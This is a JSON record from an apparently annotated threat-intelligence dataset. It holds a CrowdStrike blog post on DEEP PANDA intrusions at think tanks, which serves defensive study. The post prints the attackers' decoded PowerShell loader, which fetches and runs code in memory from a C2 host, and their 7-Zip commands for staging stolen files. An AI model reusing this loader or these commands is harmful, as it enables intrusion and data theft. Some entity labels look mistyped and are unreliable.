[{"sents": ["2016/5/2Deep in Thought: Chinese Targeting of National Security Think Tanks »Deep in Thought: ChineseTargeting of National SecurityThink TanksJuly 7, 2014Dmitri AlperovitchExecutive ViewpointFor some time now, CrowdStrike has been working with anumber of national security think tanks and human rightsorganizations on a pro bono basis to help them with theirsecurity posture.", "These organizations face some of the mostadvanced nation-state adversaries — China, Russia, and Iran,just to name a few.", "The individuals who are typically targeted atthese institutions tend to be former senior government officialswho still have lots of contacts within Western governments and,as such, their private correspondence is of extreme interest tothese attackers.", "The intelligence services of these nation statesare always on the lookout for any clues they may extract fromsuch private communications that may give them an advancedinsight into what options government policy makers areconsidering on particular issues of interest.", "At the same time,with access to the victim email mailboxes, the adversaries canhttp://www.crowdstrike.com/blog/deep-thought-chinese-targeting-national-security-think-tanks/1/9\f2016/5/2Deep in Thought: Chinese Targeting of National Security Think Tanks »craft very realistic spear-phishing lures to the governmentcontacts of targeted think tank personnel by piggybacking onongoing real conversations and increasing their chances of asuccessful compromise of an official government email account.", "Despite this high threat level, these think tanks are organized asnon-profits and often do not have the budgets of commercialorganizations to afford cutting-edge security technologies thatcan help them effectively detect these threats.", "For this reason,CrowdStrike has provided our Falcon Host endpoint securitytechnology to many of these organizations at no charge to themto help detect and attribute these attackers on their networks inreal time, as well as to receive instantaneous full forensicvisibility into their behavior to help with full remediation of anyincident.", "Recently, Falcon Host has detected multiple simultaneouscompromises at several national security think tanks from anactor we call DEEP PANDA, one of the most advanced Chinesenation-state cyber intrusion groups.", "For almost three years now,CrowdStrike has monitored DEEP PANDA targeting critical andstrategic business verticals including: government, defense,financial, legal, and the telecommunications industries.", "At thethink tanks, Falcon Host detected targeting of senior individualsinvolved in geopolitical policy issues, in particular in theChina/Asia Pacific region.", "However, last week the unprecedentedreal-time visibility provided by Falcon Host into this actor’sescapades allowed analysts to observe a radical change intargeting.", "This actor, who was engaged in targeting and collection ofSoutheast Asia policy information, suddenly began targetingindividuals with a tie to Iraq/Middle East issues.", "This isundoubtedly related to the recent Islamic State of Iraq and theLevant (ISIS) takeover of major parts of Iraq and the potentialdisruption for major Chinese oil interests in that country.", "In fact,Iraq happens to be the fifth-largest source of crude oil importsfor China and the country is the largest foreign investor in Iraq’soil sector.", "Thus, it wouldn’t be surprising if the Chinesegovernment is highly interested in getting a better sense of thepossibility of deeper U.S. military involvement that could helpprotect the Chinese oil infrastructure in Iraq.", "In fact, the shift intargeting of Iraq policy individuals occurred on June 18, the dayhttp://www.crowdstrike.com/blog/deep-thought-chinese-targeting-national-security-think-tanks/2/9\f2016/5/2Deep in Thought: Chinese Targeting of National Security Think Tanks »that ISIS began its attack on the Baiji oil refinery.", "The AttacksCrowdStrike’s Falcon Host technology used by these think tanksconsists of a tiny (under 5mb in size) kernel sensor that isdeployed on Windows and Mac servers, desktops, and laptopsand is able to do real-time detection and recording of alladversary activities taking place on the system.", "In addition, bymatching the detected activities against our vast AdversaryIntelligence repository, Falcon Host can automatically attributethe attack to a known adversary group and provide details abouttheir motivations, capabilities, and key Tactics, Techniques, andProcedures (TTPs).", "Recently, we detected breaches of these networks via the use ofpowershell scripts deployed by the adversary as scheduled taskson Windows machines.", "The scripts are passed to the powershellinterpreter through the command line to avoid placement ofextraneous files on the victim machine that could potentiallytrigger AV- or Indicator of Compromise (IOC)-based detection.", "The scripts were scheduled to call back every two hours to theDEEP PANDA Command and Control (C2) infrastructure.", "The script in the command line is base64 encoded, but whendecoded it translates to the following code snippet:[System.Net.ServicePointManager]::ServerCertificateValidationCallbackhttp://www.crowdstrike.com/blog/deep-thought-chinese-targeting-national-security-think-tanks/3/9\f2016/5/2Deep in Thought: Chinese Targeting of National Security Think Tanks »= {$true}$wc = New­Object ­TypeName System.Net.WebClient$wc.Headers.Add(“Accept­Language”, “en­US,en;q=0.” + ([IntPtr]::Size – 1).ToString())$wc.Headers.Add(“User­Agent”, “Mozilla/5.0(compatible; MSIE 10.0; Windows NT 6.1; WOW64;Trident/6.0)”)$rndn = Get­Random$wc.Headers.Add(“Cookie”, “p=” + $rndn)$data =$wc.DownloadData(“https://<ANONYMIZED>/config/oauth/”)[string[]]$xags =“https://<ANONYMIZED>/config/login/”,“WMITool.Program”, “Main”, “/f”, “ssh”, “/s”,“<ANONYMIZED>”, “/p”, “443”$Passphrase = “<ANONYMIZED>”$salts = “<ANONYMIZED>”$r = new­ObjectSystem.Security.Cryptography.RijndaelManaged$pass =[System.Text.Encoding]::UTF8.GetBytes($Passphrase)$salt =[System.Text.Encoding]::UTF8.GetBytes($salts)$r.Key = (new­ObjectSecurity.Cryptography.PasswordDeriveBytes $pass,$salt, “SHA1”, 5).GetBytes(32) #256/8$r.IV = (new­ObjectSecurity.Cryptography.SHA1Managed).ComputeHash([Text.Encoding]::UTF8.GetBytes($rndn) )[0..15]$d = $r.CreateDecryptor()$ms = new­Object IO.MemoryStream @(,$data)$cs = new­ObjectSecurity.Cryptography.CryptoStream $ms,$d,”Read”$dfs = New­ObjectSystem.IO.Compression.GzipStream $cs,([IO.Compression.CompressionMode]::Decompress)$msout = New­Object System.IO.MemoryStream[byte[]]$buffer = new­object byte[] 4096[int]$count = 0do{$count = $dfs.Read($buffer, 0, $buffer.Length)$msout.Write($buffer, 0, $count)} while ($count ­gt 0)$dfs.Close()$cs.Close()$ms.Close()$r.Clear()[byte[]]$bin = $msout.ToArray()$al = New­Object ­TypeNameSystem.Collections.ArrayList$al.Add($xags)$asm = [System.Reflection.Assembly]::Load($bin)$asm.EntryPoint.Invoke($null, $al.ToArray())sleep 5ExitOnce executed, it downloads and executes from memory a .NETexecutable (typically named Wafer), which in turn typicallyhttp://www.crowdstrike.com/blog/deep-thought-chinese-targeting-national-security-think-tanks/4/9\f2016/5/2Deep in Thought: Chinese Targeting of National Security Think Tanks »downloads and runs MadHatter .NET Remote Access Tool (RAT),one of the favorites of DEEP PANDA.", "By running them frommemory, it leaves no disk artifacts or host-based IOCs that canbe identified in forensic analysis.", "This is typical for DEEP PANDA— stealth is their specialty and they prefer to operate in a waythat leaves a minimal footprint on a victim system and oftenallows them to evade detection for a very long time.", "For this same reason, DEEP PANDA likes to use webshells to keeplow-footprint persistent access to the victim network, as we’vecovered in our prior blogs.", "This case was no exception, and thatinitial webshell implant allowed them to execute reconnaissancecommands such as “tasklist,” “net view,” and “netlocalgroup administrators,” and then afterward to deploy thepowershell scripts.", "The adversary used stolen credentials to mount network sharesvia “net use” command.", "In one case, they brought in Cult ofthe Dead Cow’s NetE tool onto the system, but most of the timethey leveraged existing Windows tools and avoided bringingmany new tools into the environment that could make themnoisy and easily detectable by technologies that scan for staticIOCs.", "After using compromised credentials to mount file shares, theadversary was seen compressing data using 7-zip.", "They wereadding different document types to compressed files bywildcarding the extensions, such as:“C:Program Files7­Zip7z” a setup1.log ­r ­pkkk***“\\<share name>users<UserName>*rtf *doc”“C:Program Files7­Zip7z” a setup1.log ­r ­pkkk***“\\<share name>users<UserName>*ppt”They knew exactly which users to target based on their researchpolicy area, and they rapidly pivoted from China/Asia Pacificpolicy experts to Iraq/Middle East policy experts once theirtasking collection requirements changed.", "http://www.crowdstrike.com/blog/deep-thought-chinese-targeting-national-security-think-tanks/5/9\f2016/5/2Deep in Thought: Chinese Targeting of National Security Think Tanks »Aggressive Use of Ping to Determine Which Machines of Interestare OnlineOn one of the compromised machines, the adversary brought ina command-line version of RAR archiver that was named“cftmon.exe” and placed it into “c:windowstemphotfix”directory.", "The files were encrypted (both file data and headers)with “uinfw” password and the archive files were named afterthe initials of each user that had been targeted and stored in thesame “c:windowstemphotfix” directory.", "For lateral movement, they used WMI to deploy the powershellscripts remotely and setup scheduled tasks on the remotesystems.", "BLOGDespite the fact that we were seeing nearly identical TTPs usedacross multiple think-tank targets, there is evidence to indicatehttp://www.crowdstrike.com/blog/deep-thought-chinese-targeting-national-security-think-tanks/6/9\f2016/5/2Deep in Thought: Chinese Targeting of National Security Think Tanks »that these operations had different individuals behind thekeyboard based on the intricacies of how certain powershellcommand lines had been used in each case.", "SummaryDEEP PANDA presents a very serious threat not just to thinktanks, but also multinational financial institutions, law firms,defense contractors, and government agencies.", "Due to theirstellar operational security and reliance on anti-forensic andanti-IOC detection techniques, detecting and stopping them isvery challenging without the use of next-generation endpointtechnology like Falcon Host.", "Not only was Falcon Host able todetect this adversary without relying on static signatures orIOCs, but it was able to provide instantaneous and full forensicanalysis of what had occurred on each of the compromisedendpoints without the need to pull hard drives and do costly andtime-intensive forensics, substantially reducing the time neededfor remediation.", "If you are a non-profit think tank or a human rights organizationthat would like to take advantage of our no-charge offer of FalconHost licenses for your servers and desktops, please email us atsales@crowdstrike.com with the subject “Non-Profit FalconHost Offer.”Our Falcon Intelligence subscribers have had access to multiplereports on the DEEP PANDA actor that includes full analysis oftheir attribution, tradecraft and TTPs, as well as detectionindicators and signatures and remediation instructions.", "And ourCrowdStrike Services has worked on multiple intrusioninvestigations related to DEEP PANDA in the last year.", "If youwould also like to see a demo of Falcon Host or FalconIntelligence in action or discuss our Services offerings, pleasecontact our Sales Team to schedule a personal briefing.", "Stay safe and keep a watchful eye on the Pandas, Bears, Kittens,and other adversaries who are relentlessly preying on your data!", " Tweet Sharehttp://www.crowdstrike.com/blog/deep-thought-chinese-targeting-national-security-think-tanks/7/9\f2016/5/2Deep in Thought: Chinese Targeting of National Security Think Tanks »Dmitri AlperovitchCo-founder and CTO of Crowdstrike, Dmitri Alperovitchleads the Intelligence, Technology and CrowdStrike Labsteams.", "Alperovitch has invented 18 patentedtechnologies and has conducted extensive research onreputation systems, spam detection, web security,public-key and identity-based cryptography, malwareand intrusion detection/prevention.", "He is a renownedcomputer security researcher and thought leader oncybersecurity policies and state tradecraft.", "Alperovitch’s many honors include being selected asMIT Technology Review’s “Young Innovators under35” (TR35) in 2013.", "He also was named Foreign PolicyMagazine’s Leading Global Thinker for 2013 andreceived a Federal 100 Award for his informationsecurity contributions.", "Related ContentU.S. – ChinaAgreement onCyberIntrusions: AnInflectionPointAre You MoreInterested inStopping aBreach orStoppingMalware?", "VENOMVulnerability:CommunityPatching andMitigationUpdateChineseThis is aToday,economicquestion I ask aCrowdStrikeespionagelot ofdisclosed areached itsorganizationscritical virtualboiling pointthat I speak with.", "machine escapesome time ago,While the…vulnerabilityand has been(which we namedscaldingVENOM)industriesdiscovered bythroughout…our…http://www.crowdstrike.com/blog/deep-thought-chinese-targeting-national-security-think-tanks/8/9\f2016/5/2Deep in Thought: Chinese Targeting of National Security Think Tanks »Copyright © 2016 CrowdStrike |Privacy |Request Info |http://www.crowdstrike.com/blog/deep-thought-chinese-targeting-national-security-think-tanks/Blog |Contact Us |1.888.512.89069/9"], "title": "201407CrowdStrikeDeepPanda", "vertexSet": [[{"name": "CrowdStrike", "brat_id": "T1", "pos": [33, 34], "type": "Organization", "sent_id": 0}, {"name": "CrowdStrike", "brat_id": "T2", "pos": [33, 34], "type": "Organization", "sent_id": 0}, {"name": "CrowdStrike", "brat_id": "T6", "pos": [5, 6], "type": "Organization", "sent_id": 8}], [{"name": "Falcon Host", "brat_id": "T3", "pos": [7, 9], "type": "Software", "sent_id": 6}, {"name": "Falcon Host", "brat_id": "T4", "pos": [7, 9], "type": "Software", "sent_id": 6}, {"name": "Falcon Host", "brat_id": "T9", "pos": [4, 6], "type": "Software", "sent_id": 9}, {"name": "Falcon Host", "brat_id": "T10", "pos": [4, 6], "type": "Software", "sent_id": 9}, {"name": "Falcon Host", "brat_id": "T12", "pos": [3, 5], "type": "Software", "sent_id": 16}], [{"name": "DEEP PANDA", "brat_id": "T5", "pos": [19, 21], "type": "Attacker", "sent_id": 7}, {"name": "DEEP PANDA", "brat_id": "T7", "pos": [8, 10], "type": "Address", "sent_id": 8}, {"name": "DEEP PANDA", "brat_id": "T14", "pos": [12, 14], "type": "Attacker", "sent_id": 20}, {"name": "DEEP PANDA", "brat_id": "T18", "pos": [223, 225], "type": "Attacker", "sent_id": 21}, {"name": "DEEP PANDA", "brat_id": "T19", "pos": [223, 225], "type": "Attacker", "sent_id": 21}, {"name": "DEEP PANDA", "brat_id": "T20", "pos": [223, 225], "type": "Attacker", "sent_id": 21}], [{"name": "Southeast Asia policy information", "brat_id": "T11", "pos": [10, 14], "type": "Information", "sent_id": 11}], [{"name": "powershell scripts", "brat_id": "T13", "pos": [11, 13], "type": "Exploit", "sent_id": 18}, {"name": "powershell scripts", "brat_id": "T21", "pos": [31, 33], "type": "Exploit", "sent_id": 25}], [{"name": "base64", "brat_id": "T15", "pos": [7, 8], "type": "Obfuscation", "sent_id": 21}], [{"name": "Wafer", "brat_id": "T16", "pos": [190, 191], "type": "Payload", "sent_id": 21}], [{"name": "MadHatter .NET", "brat_id": "T17", "pos": [7375, 7389], "type": "Malware", "sent_id": 21}]], "labels": [{"brat_id": "R1", "h": 0, "t": 1, "r": "P17", "evidence": [0, 6]}, {"brat_id": "R2", "h": 2, "t": 4, "r": "P2", "evidence": [7, 18]}, {"brat_id": "R3", "h": 4, "t": 5, "r": "P13", "evidence": [18, 21]}, {"brat_id": "R4", "h": 2, "t": 7, "r": "P2", "evidence": [7, 21]}, {"brat_id": "R5", "h": 2, "t": 4, "r": "P2", "evidence": [7, 18]}]}]
